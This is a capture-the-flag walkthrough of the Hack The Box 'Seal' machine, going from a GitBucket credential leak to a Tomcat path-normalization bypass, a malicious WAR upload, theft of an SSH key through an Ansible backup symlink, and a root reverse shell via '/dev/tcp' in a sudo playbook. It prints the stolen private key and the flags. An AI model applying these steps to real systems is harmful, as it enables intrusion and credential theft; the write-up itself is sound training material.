@@ -1,0 +1,515 @@
+HTB - SEAL - Linux
+
+We have a few ports open: ssh 22, https443, http8080
+Based on the out of port 443 we can see the hostname seal.htb of the file which we can add
+to our hosts. As for port 8080 we find that it is running ngninx with a login prompt for 
+gitbucket.
+
+When we see ngnix it is most likely not php, most likely a python, ruby on rails, tomcat or
+some other application. where nginx is just a reverse proxy. 
+
+Port 8080 nmap says its reverse proxy but its most likely a definitely a webserver with a
+401 request, likely tomcat server, we also get jsession cookie.
+
+Looking at seal.htb no virtual host routing.
+
+We can search for vegetables but no output pretty much static.
+We can try and fuzz parameters on the https page for the vegetable search query using burp 
+to intercept.
+
+After using repeater and trying various queries it appears that the number of bytes returned
+remains the same, meaning that the page remains static.
+
+We can try wfuzz on the web page to see if the we can fuzz the input and get abnormal output
+'/?+Vegetable=broccoli'
+
+COMMANDS:
+=============================================================================================
+──(kali㉿kali)-[~/htb/linux/seal]
+└─$ wfuzz -u https://10.10.10.250/?+Vegetable=BroccoliFUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+000000007:   400        11 L     133 W      1990 Ch     "^"                          
+000000011:   200        518 L    1140 W     19737 Ch    ")"                          
+000000010:   200        518 L    1140 W     19737 Ch    "("                          
+000000009:   200        518 L    1140 W     19737 Ch    "*"                          
+000000006:   200        518 L    1140 W     19737 Ch    "%"                          
+000000008:   200        518 L    1140 W     19737 Ch    "&"                          
+000000005:   200        518 L    1140 W     19737 Ch    "$"                          
+000000001:   200        518 L    1140 W     19737 Ch    "~"                          
+000000003:   200        518 L    1140 W     19737 Ch    "@"                          
+000000012:   200        518 L    1140 W     19737 Ch    "-"                          
+000000004:   200        518 L    1140 W     19737 Ch    "#"                          
+000000013:   200        518 L    1140 W     19737 Ch    "_"                          
+000000015:   200        518 L    1140 W     19737 Ch    "="                          
+000000014:   200        518 L    1140 W     19737 Ch    "+"                          
+000000016:   400        11 L     133 W      1990 Ch     "{"                          
+000000017:   400        11 L     133 W      1990 Ch     "}"                          
+000000002:   200        518 L    1140 W     19737 Ch    "!"                          
+000000023:   200        518 L    1140 W     19737 Ch    ","                          
+000000019:   400        11 L     133 W      1990 Ch     "["                          
+000000025:   200        518 L    1140 W     19737 Ch    "/"                          
+000000022:   400        11 L     133 W      1990 Ch     "`"                          
+000000024:   200        518 L    1140 W     19737 Ch    "."                          
+000000021:   400        11 L     133 W      1990 Ch     "\"                          
+000000018:   400        11 L     133 W      1990 Ch     "]"                          
+000000020:   400        11 L     133 W      1990 Ch     "|"                          
+000000026:   200        518 L    1140 W     19737 Ch    "?"                          
+000000028:   200        518 L    1140 W     19737 Ch    ":"                          
+000000031:   400        11 L     133 W      1990 Ch     "<"                          
+000000032:   400        11 L     133 W      1990 Ch     ">"                          
+000000027:   200        518 L    1140 W     19737 Ch    ";"                          
+000000029:   200        518 L    1140 W     19737 Ch    "'"                          
+000000030:   400        11 L     133 W      1990 Ch     """                          
+
+Total time: 0
+Processed Requests: 32
+Filtered Requests: 0
+Requests/sec.: 0
+=============================================================================================
+
+We can now see a lot 400 errors, we will url encode, first we list all url encoders available 
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/seal]
+└─$ wfuzz -e encoders
+..
+..
+..
+
+                        
+  url           | uri_double_hex    | Encodes ALL charachers using the %25xx escape.                                    
+  url           | uri_hex           | Encodes ALL charachers using the %xx escape.                                      
+  url           | uri_triple_hex    | Encodes ALL charachers using the %25%xx%xx escape.    
+
+..
+..
+..
+=============================================================================================
+
+We will use the uri hex encoder and we will append that to our wfuzz query.
+COMMANDS:
+=============================================================================================
+└─$ wfuzz -u https://10.10.10.250/?+Vegetable=BroccoliFUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt,uri_hex
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://10.10.10.250/?+Vegetable=BroccoliFUZZ
+Total requests: 32
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+000000002:   200        518 L    1140 W     19737 Ch    "%21"                        
+000000003:   200        518 L    1140 W     19737 Ch    "@"                          
+000000005:   200        518 L    1140 W     19737 Ch    "%24"                        
+000000004:   200        518 L    1140 W     19737 Ch    "%23"                        
+000000006:   200        518 L    1140 W     19737 Ch    "%25"                        
+000000007:   200        518 L    1140 W     19737 Ch    "%5e"                        
+000000008:   200        518 L    1140 W     19737 Ch    "&"                          
+000000009:   200        518 L    1140 W     19737 Ch    "%2a"                        
+000000010:   200        518 L    1140 W     19737 Ch    "%28"                        
+000000001:   200        518 L    1140 W     19737 Ch    "%7e"                        
+000000011:   200        518 L    1140 W     19737 Ch    "%29"                        
+000000012:   200        518 L    1140 W     19737 Ch    "%2d"                        
+000000014:   200        518 L    1140 W     19737 Ch    "%2b"                        
+000000013:   200        518 L    1140 W     19737 Ch    "%5f"                        
+000000015:   200        518 L    1140 W     19737 Ch    "="                          
+000000016:   200        518 L    1140 W     19737 Ch    "%7b"                        
+000000017:   200        518 L    1140 W     19737 Ch    "%7d"                        
+000000018:   200        518 L    1140 W     19737 Ch    "%5d"                        
+000000019:   200        518 L    1140 W     19737 Ch    "%5b"                        
+000000020:   200        518 L    1140 W     19737 Ch    "%7c"                        
+000000021:   400        11 L     133 W      1990 Ch     "\"                          
+000000022:   200        518 L    1140 W     19737 Ch    "%60"                        
+000000023:   200        518 L    1140 W     19737 Ch    "%2c"                        
+000000024:   200        518 L    1140 W     19737 Ch    "%2e"                        
+000000025:   200        518 L    1140 W     19737 Ch    "/"                          
+000000026:   200        518 L    1140 W     19737 Ch    "?"                          
+000000027:   200        518 L    1140 W     19737 Ch    ";"                          
+000000028:   200        518 L    1140 W     19737 Ch    ":"                          
+000000029:   200        518 L    1140 W     19737 Ch    "%27"                        
+000000030:   200        518 L    1140 W     19737 Ch    "%22"                        
+000000032:   200        518 L    1140 W     19737 Ch    "%3e"                        
+000000031:   200        518 L    1140 W     19737 Ch    "%3c"                        
+
+Total time: 0
+Processed Requests: 32
+Filtered Requests: 0
+Requests/sec.: 0
+=============================================================================================
+
+Only one request returned a 400 error, but not much can be determined from the encoded 
+characters. If '{' ssti, '"' sql injection, '?;' dont know much to do with those.
+
+So we skip and run a gobuster running on the background.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/seal]
+└─$ gobuster dir -u https://10.10.10.250 -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
+=============================================================================================
+
+Pretty sure that jsessionid refers to tomcat applicaton running in the background.
+We also see on port 8080 the authentication for gitbucket is necessary if we google for a bit
+we come to find default creds are root:root but those do not work.
+
+No version for gitbucket is found so we try and create an account. Test2:test creds
+
+Once logged in we have two repos "infra" and "seal_market"
+
+We search bith repos starting with infra but only find a yml file used for ansible that 
+installing software.
+
+
+"infra / roles / tomcat / tasks / main.yml"
+
+Meanwhile for the seal market repo we search the commit history and we find 2 different 
+commits.
+
+"seal_market / tomcat"
+
+In the commit history we search for keywords such as 'password' and get a hit for the tomcat-
+user.xml file
+
+'tomcat/tomcat-users.xml 0 → 100644'
+COMMANDS:
+=============================================================================================
+<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
+		</tomcat-users>
+=============================================================================================
+
+We get creds for the tomcat user.
+After doing more digging we find an interesting file in:
+'seal_market / nginx / sites-available / default '
+
+Which contains info about /manager/html where we learn there is mutual authentication,
+ssl client verification.
+
+This is done as well in /admin/dashboard
+
+We will look an SSRF attack in specific with tomcat and ngnix.
+https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+
+With the reading of the ssrf attack we come to find that we can break the logic of the tomcat
+server by adding a semicolon to the directory path of our choosing which we will then by 
+pass any of the nginx preventitive measure and give us access to pages that we were previously
+not allowed to view or interact with.
+COMMANDS:
+=============================================================================================
+				When reverse proxy meets...
+			http://example.com/foo;name=orange/bar/
+					Behavior
+		Apache 		/foo;name=orange/bar/
+		Nginx 		/foo;name=orange/bar/
+		IIS 		/foo;name=orange/bar/
+		Tomcat 		/foo/bar/
+		Jetty 		/foo/bar/
+		WildFly 	/foo
+		WebLogic	/foo
+
+=============================================================================================
+
+In our case we can go to site previously outlined in the 'sites available default' config
+by including semicolon in the webpage path.
+Example:
+=============================================================================================
+https://10.10.10.250/manager;sksksksks=sms/html
+=============================================================================================
+
+Redirects us to /manager/html which where before we could not reach(403 Forbidden) but now can
+reach. WIth the bypass. 
+
+We can now enter our tomcat creds from before and we are logged in.
+If we tried the original login page we could still get denied.
+
+We can also do the same for the dashboard webpage specified in the default config page
+COMMANDS:
+=============================================================================================
+https://10.10.10.250/admin;name=hello/dashboard/
+
+OR 
+
+https://10.10.10.250/admin/hello/..;/dashboard/
+=============================================================================================
+
+
+Also works with '/hello/,,;' now that we have access to the tomcat server we can upload a 
+warfile and get access to the linux system.
+
+Lets create a malicious warfile for tomcat using msfvenom.
+COMMANDS:
+=============================================================================================
+https://10.10.10.250/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=C5C237DA63C8E7907CE7493F6948AAC6
+=============================================================================================
+
+
+One thing to note is that we attempt to upload the war file it will not work since our
+browser will attempt to upload the file with the correct path noth the janky one so we will
+have to use burp suite to modify the request and upload it properly.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/seal]
+└─$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.250] 48494
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+tomcat@seal:/var/lib/tomcat9$ ^Z
+zsh: suspended  nc -lnvp 9001
+                                                                                              
+┌──(kali㉿kali)-[~/htb/linux/seal]
+└─$ stty raw -echo;fg      
+[1]  + continued  nc -lnvp 9001
+
+tomcat@seal:/var/lib/tomcat9$ export TERM=xterm
+tomcat@seal:/var/lib/tomcat9$ 
+
+=============================================================================================
+
+We now have a working shell, there is still a user 'luis' that we have to pivot into to
+get the user.txt.
+
+We could run linpeas or pspy. In this case we will run pspy to look at the live active 
+processes on the system.
+
+We can download the small executable from here and copy to the victim machine
+
+COMMANDS:
+=============================================================================================
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+tomcat@seal:/dev/shm$ ./pspy64s 
+pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
+
+..
+..
+..
+
+2022/07/03 23:11:11 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
+2022/07/03 23:11:31 CMD: UID=0    PID=48699  | sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml                                                                         
+2022/07/03 23:11:31 CMD: UID=1000 PID=48700  | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml  
+
+..
+..
+..
+=============================================================================================
+
+It appears the luis user is using the ansible playbook in sudo to run a backup there might be
+a misconfiguration running this every 30 seconds.
+
+Lets take a look at the yml file.
+
+Looks like Luis is backing one of the files that is writeable by the tomcat user.
+COMMANDS:
+=============================================================================================
+- hosts: localhost
+  tasks:
+  - name: Copy Files
+    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/bacc
+kups/files copy_links=yes
+  - name: Server Backups
+    archive:
+      path: /opt/backups/files/
+      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_dd
+ate_time.time}}.gz"
+  - name: Clean
+    file:
+      state: absent
+      path: /opt/backups/files/
+=============================================================================================
+
+We go to that synchronizing directory and come to find that the upload directory is writeable
+COMMANDS:
+=============================================================================================
+EXTRA FIXING COLS ROWS:
+┌──(kali㉿kali)-[~/htb/linux/seal/www]
+└─$ stty -a          
+speed 38400 baud; rows 24; columns 94; line = 0;
+tomcat@seal:/$ stty rows 24 cols 94
+
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ find . -writable -ls
+    64791      4 drwxrwxrwx   2 root     root         4096 May  7  2021 ./uploads
+=============================================================================================
+
+With this we will try to copy the ssh key of luis
+COMMANDS:
+=============================================================================================
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
+total 8
+drwxrwxrwx 2 root   root   4096 Jul  3 23:26 .
+drwxr-xr-x 7 root   root   4096 May  7  2021 ..
+lrwxrwxrwx 1 tomcat tomcat   22 Jul  3 23:26 luis.pem -> /home/luis/.ssh/id_rsa
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cat luis.pem 
+cat: luis.pem: Permission denied
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /opt/backups/
+tomcat@seal:/opt/backups$ ls
+archives  playbook
+tomcat@seal:/opt/backups$ cd archives/
+tomcat@seal:/opt/backups/archives$ ls -l
+total 1780
+-rw-rw-r-- 1 luis luis 606047 Jul  3 23:25 backup-2022-07-03-23:25:33.gz
+-rw-rw-r-- 1 luis luis 606047 Jul  3 23:26 backup-2022-07-03-23:26:33.gz
+-rw-rw-r-- 1 luis luis 608925 Jul  3 23:27 backup-2022-07-03-23:27:32.gz
+tomcat@seal:/opt/backups/archives$ cp backup-2022-07-03-23\:27\:32.gz /dev/shm/
+tomcat@seal:/opt/backups/archives$ cd !$
+cd /dev/shm/
+tomcat@seal:/dev/shm$ ls
+backup-2022-07-03-23:27:32.gz  pspy64s
+
+tomcat@seal:/dev/shm$ mv backup-2022-07-03-23\:27\:32 backup
+tomcat@seal:/dev/shm$ tar xvf backup 
+...
+...
+...
+
+dashboard/
+dashboard/scripts/
+dashboard/uploads/luis.pem
+
+...
+...
+...
+
+tomcat@seal:/dev/shm$ ls
+backup  dashboard  pspy64s
+tomcat@seal:/dev/shm$ cd dashboard/uploads/
+tomcat@seal:/dev/shm/dashboard/uploads$ cat luis.pem 
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
+-----END OPENSSH PRIVATE KEY-----
+
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/seal]
+└─$ ssh luis@10.10.10.250 -i luis_id_rsa 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+
+..
+..
+..
+
+Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
+luis@seal:~$ whoami
+luis
+
+luis@seal:~$ id
+uid=1000(luis) gid=1000(luis) groups=1000(luis)
+luis@seal:~$ cat user.txt
+7aea7c3c2b079dba3f6ad427ea2a9cca
+=============================================================================================
+
+Now we can try and get root by exploiting the sudo command that is allowed to be used by luis
+COMMANDS:
+=============================================================================================
+luis@seal:~$ sudo -l
+Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
+=============================================================================================
+
+Looks like you can run the ansible playbook to automate a task as root on whatever file
+you specify. You could either create an suid shell file to run and get root or get
+a root reverse shell.
+
+We will copy the run.yml from /opt to use as a template and modify it to get a reverse shell.
+
+COMMANDS: (run.yml MODIFIED)
+=============================================================================================
+- hosts: localhost
+  tasks:
+  - name: Get Shell
+    command: /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+luis@seal:~$ cp /opt/backups/playbook/run.yml .
+luis@seal:~$ vim run.yml 
+luis@seal:~$ sudo /usr/bin/ansible-playbook run.yml 
+[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit
+localhost does not match 'all'
+
+PLAY [localhost] *****************************************************************************
+
+TASK [Gathering Facts] ***********************************************************************
+ok: [localhost]
+
+TASK [Get Shell] *****************************************************************************
+
+=============================================================================================
+
+ROOT REVERSE SHELL RECEIVED
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/seal]
+└─$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.250] 48506
+root@seal:/home/luis# whoami
+whoami
+root
+root@seal:/home/luis# cd /rott
+cd /rott
+bash: cd: /rott: No such file or directory
+root@seal:/home/luis# cd /root
+cd /root
+root@seal:~# cat root.txt
+cat root.txt
+a6777a6b180af62ecfaae91a4ff9f828
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
